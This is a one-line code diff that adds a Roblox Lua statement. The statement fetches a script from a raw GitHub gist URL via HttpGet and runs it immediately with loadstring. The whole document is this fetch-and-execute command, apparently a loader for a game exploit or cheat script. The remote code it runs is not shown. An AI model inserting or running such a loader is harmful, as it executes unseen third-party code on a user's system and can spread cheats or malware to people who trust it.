@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/alexbomb6666/0ccafd480ea91b6a31c81d39e8b869e9/raw/2469aafbc1b6afb1361b429655ab7ee1cb4143c4/wl3_real"))()
